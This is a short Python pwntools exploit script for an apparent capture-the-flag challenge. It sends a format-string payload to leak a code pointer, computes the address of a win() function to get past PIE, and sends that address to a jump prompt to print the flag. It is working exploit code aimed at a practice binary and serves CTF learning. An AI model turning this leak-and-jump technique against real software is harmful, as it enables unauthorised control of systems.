#!/usr/bin/env python3
"""pwntools template: PIE leak-and-jump (format string + function pointer) exploit.

Target interaction (PIE TIME 2 style):
    Enter your name:  <we send %19$p to leak main+0x41>
    enter the address to jump to, ex => 0x12345:  <we send win addr>
    -> "You won!" + flag

Usage:
    python exploit.py                  # connects to HOST:PORT below
    python exploit.py <host> <port>    # override host/port
"""
from pwn import *
import sys

HOST = "127.0.0.1"
PORT = 12345


def get_win_address(io):
    """Leak a code pointer via format string and return the computed win() address."""
    io.recvuntil(b"Enter your name:")
    io.sendline(b"%19$p")                      # -> main+0x41
    leak_line = io.recvline()
    leak = int(leak_line.split(b" ")[0], 16)   # e.g. 0x5cb049319441
    log.info("leak (main+0x41): %#x", leak)

    # Constants from `nm ./vuln | grep -wE "main|win"`: main=0x133d, win=0x12a7 (0x96 apart)
    MAIN_OFF = 0x133d
    WIN_OFF = 0x12a7
    LEAK_SLOT_OFF = 0x41                       # leak points at main+0x41
    win = leak - LEAK_SLOT_OFF - (MAIN_OFF - WIN_OFF)
    log.info("win: %#x", win)
    return win


def exploit(host, port):
    r = remote(host, port, timeout=15)
    win = get_win_address(r)

    r.recvuntil(b"enter the address to jump to, ex => 0x12345: ")
    r.sendline(hex(win).encode())
    out = r.recvall(timeout=10).decode(errors="replace")
    print(out)
    r.close()
    return out


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT
    exploit(host, port)
